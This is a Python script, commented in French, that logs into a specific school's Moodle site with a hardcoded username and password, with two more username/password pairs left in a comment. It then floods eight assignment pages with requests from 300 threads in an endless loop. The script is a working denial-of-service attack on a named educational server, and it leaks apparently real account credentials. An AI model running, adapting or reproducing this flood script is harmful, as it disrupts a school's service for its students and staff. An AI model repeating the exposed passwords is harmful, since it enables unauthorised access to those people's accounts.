#!/usr/bin/env python3
import requests
import time
import random
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup  # Pour parser le HTML et extraire le token CSRF








# URL de la page de connexion
LOGIN_URL = "https://moodle.rsce.fr/login/index.php"








# Identifiants de connexion
USERNAME = "t.amsen"  # b.defossez mcoquet
PASSWORD = "XTW.2006.fr"  # Defos01d* Lola/2017












# Liste des URLs à tester après connexion
urls = [
   "https://moodle.rsce.fr/mod/assign/view.php?id=2778",
   "https://moodle.rsce.fr/mod/assign/view.php?id=2752",
   "https://moodle.rsce.fr/mod/assign/view.php?id=2253",
   "https://moodle.rsce.fr/mod/assign/view.php?id=4258",
   "https://moodle.rsce.fr/mod/assign/view.php?id=9876",
   "https://moodle.rsce.fr/mod/assign/view.php?id=4321",
   "https://moodle.rsce.fr/mod/assign/view.php?id=1234",
   "https://moodle.rsce.fr/mod/assign/view.php?id=1895"
]








# Fonction pour se connecter
def login(session):
    try:
        # Récupérer la page de connexion pour extraire le token CSRF
        response = session.get(LOGIN_URL)
        soup = BeautifulSoup(response.text, 'html.parser')








        # Extraire le token CSRF (s'il existe)
        csrf_token = soup.find('input', {'name': 'logintoken'})['value'] if soup.find('input', {'name': 'logintoken'}) else None








        if not csrf_token:
            print("Token CSRF non trouvé. Le formulaire de connexion a peut-être changé.")
            return False








        # Données à envoyer pour la connexion
        login_data = {
            "username": USERNAME,
            "password": PASSWORD,
            "logintoken": csrf_token  # Inclure le token CSRF
        }








        # Envoyer la requête POST pour se connecter
        response = session.post(LOGIN_URL, data=login_data)








        # Vérifier si la connexion a réussi
        if response.status_code == 200 and "Déconnexion" in response.text:
            print("Connexion réussie !")
            return True
        else:
            print("Échec de la connexion. Vérifiez les identifiants ou le formulaire de connexion.")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Erreur lors de la connexion : {e}")
        return False








# Fonction pour envoyer une requête
def send_request(session, url):
    try:
        response = session.get(url)
        print(f"Requête à {url} - Statut : {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Erreur pour {url} : {e}")








# Fonction principale pour spammer les requêtes
def spam_requests():
    # Créer une session pour maintenir les cookies
    session = requests.Session()
   
    # Se connecter
    if not login(session):
        print("Impossible de se connecter. Arrêt du script.")
        return
   
    # Utilisation de ThreadPoolExecutor pour gérer plusieurs threads
    with ThreadPoolExecutor(max_workers=300) as executor:  # 300 threads simultanés
        while True:
            # Choisir une URL aléatoire dans la liste
            url = random.choice(urls)
            # Soumettre la tâche au pool de threads
            executor.submit(send_request, session, url)
            # Réduire le délai entre les soumissions de tâches
            time.sleep(0.01)  # Délai très court pour augmenter la fréquence








if __name__ == "__main__":
    spam_requests()





























